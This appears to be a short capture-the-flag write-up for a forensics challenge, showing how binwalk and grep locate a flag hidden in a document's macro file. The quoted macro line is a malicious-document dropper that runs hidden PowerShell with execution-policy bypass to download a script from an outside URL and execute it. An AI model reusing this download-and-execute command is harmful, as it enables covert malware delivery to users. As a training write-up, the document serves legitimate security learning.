
### Bing Chilling

![Bing_Chilling](https://github.com/Hed6eH0g/ctf/blob/main/2023/byuctf/forencics/bing_chilling/figs/bing_chilling_0.png)

We can extract the contains of the attached file with `binwalk -e {filename}` and `grep -r {target_text} ./` allows us to find a text that includes `{target_text}` in the subdirectories recursively.
Fortunately, this approach with `byu` found the following text in `./Basic/Project/NewMacros.xml`.
```
./Basic/Project/NewMacros.xml:    FGHNBVRGHJJGFDSDUUUU = &quot;cmd /K &quot; + &quot;byu&quot; + &quot;ctf&quot; + &quot;{&quot; + &quot;m@ldocs @re&quot; + &quot;sn@eky and bad}&quot; + &quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile(&apos;http://bsrc.baidu.com/drill/doc-zh.html&apos;,&apos;%TEMP%\Y.ps1&apos;);      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%\Y.ps1&quot; 
```
Thus, we can get the flag by joining the corresponding text or a brief look at the corresponding file via the macro editor.
